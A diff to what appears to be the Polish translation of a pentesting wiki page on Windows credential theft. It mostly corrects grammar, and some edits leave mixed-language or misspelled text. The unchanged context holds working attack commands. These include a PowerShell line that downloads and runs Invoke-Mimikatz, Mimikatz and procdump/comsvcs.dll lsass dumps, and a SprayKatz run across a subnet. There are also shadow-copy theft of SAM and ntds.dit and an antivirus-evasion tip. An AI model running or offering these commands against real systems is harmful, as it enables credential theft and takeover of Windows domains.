@@ -24,7 +24,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec Mimikatz w wydobywaniu niektórych poświadczeń.**
+[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą zapobiec wydobywaniu niektórych poświadczeń przez Mimikatz.**
 
 ## Poświadczenia z Meterpreter
 
@@ -49,7 +49,7 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defendera.\
+As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defendera.\
 Możesz użyć tego narzędzia do **zrzutu procesu lsass**, **pobrania zrzutu** i **wyodrębnienia** **poświadczeń lokalnie** z zrzutu.
 ```bash:Dump lsass
 #Local
@@ -67,9 +67,9 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Ten proces jest realizowany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Uwaga**: Niektóre **AV** mogą **wykrywać** jako **złośliwe** użycie **procdump.exe do zrzutu lsass.exe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **ukrycie** się jako **argument** **PID** lsass.exe do procdump jest **bardziej dyskretne** **zamiast** używać **nazwa lsass.exe.**
+**Uwaga**: Niektóre **AV** mogą **wykrywać** użycie **procdump.exe do zrzutu lsass.exe** jako **złośliwe**, ponieważ **wykrywają** ciąg **"procdump.exe" i "lsass.exe"**. Dlatego **cichsze** jest **przekazanie** jako **argumentu** **PID** lsass.exe do procdump **zamiast** nazwy lsass.exe.
 
-### Zrzut lsass z **comsvcs.dll**
+### Zrzut lsass za pomocą **comsvcs.dll**
 
 DLL o nazwie **comsvcs.dll** znajdujący się w `C:\Windows\System32` jest odpowiedzialny za **zrzut pamięci procesu** w przypadku awarii. Ten DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania za pomocą `rundll32.exe`.\
 Nie ma znaczenia użycie pierwszych dwóch argumentów, ale trzeci jest podzielony na trzy komponenty. Identyfikator procesu do zrzutu stanowi pierwszy komponent, lokalizacja pliku zrzutu reprezentuje drugi, a trzeci komponent to ściśle słowo **full**. Nie ma alternatywnych opcji.\
@@ -96,7 +96,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpowanie lsass z PPLBlade
+## Dumpin lsass z PPLBlade
 
 [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzutu chronionych procesów, które wspiera obfuscację zrzutów pamięci i ich transfer na zdalne stacje robocze bez zapisywania ich na dysku.
 
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Ale możesz to zrobić również z **Powershell**. Oto przykład **jak skopiować plik SAM** (używany dysk twardy to "C:", a plik jest zapisywany w C:\users\Public), ale możesz to wykorzystać do kopiowania dowolnego chronionego pliku:
+Ale możesz to zrobić również za pomocą **Powershell**. Oto przykład **jak skopiować plik SAM** (używany dysk twardy to "C:", a plik jest zapisywany w C:\users\Public), ale możesz to wykorzystać do kopiowania dowolnego chronionego pliku:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -184,7 +184,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Kredencje Active Directory - NTDS.dit**
 
-Plik **NTDS.dit** jest znany jako serce **Active Directory**, przechowując kluczowe dane o obiektach użytkowników, grupach i ich członkostwie. To tutaj przechowywane są **hash'e haseł** dla użytkowników domeny. Plik ten jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.
+Plik **NTDS.dit** jest znany jako serce **Active Directory**, przechowując kluczowe dane o obiektach użytkowników, grupach i ich członkostwie. To tutaj przechowywane są **hashe haseł** dla użytkowników domeny. Plik ten jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.
 
 W tej bazie danych utrzymywane są trzy główne tabele:
 
@@ -212,7 +212,7 @@ Dostępne od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Możesz również użyć triku z [**kopią cienia woluminu**](./#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią cienia woluminu**](./#stealing-sam-and-system)).
+Możesz również użyć triku z [**kopią cienia woluminu**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz również potrzebować kopii pliku **SYSTEM** (ponownie, [**zrzutuj go z rejestru lub użyj triku z kopią cienia woluminu**](#stealing-sam-and-system)).
 
 ### **Ekstrakcja hashy z NTDS.dit**
 
@@ -230,11 +230,11 @@ Na koniec można również użyć **modułu metasploit**: _post/windows/gather/c
 
 ### **Ekstrakcja obiektów domeny z NTDS.dit do bazy danych SQLite**
 
-Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ekstrahowane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
+Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty i ich atrybuty w celu dalszej ekstrakcji informacji, gdy surowy plik NTDS.dit został już pobrany.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci czystego tekstu, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich haszami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...
+`SYSTEM` hive jest opcjonalny, ale pozwala na deszyfrowanie sekretów (hasła NT i LM, dodatkowe poświadczenia, takie jak hasła w postaci czystego tekstu, klucze kerberos lub zaufania, historie haseł NT i LM). Wraz z innymi informacjami, wyodrębniane są następujące dane: konta użytkowników i maszyn z ich hashami, flagi UAC, znacznik czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwa rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny z typem zaufania, kierunkiem i atrybutami...
 
 ## Lazagne
 
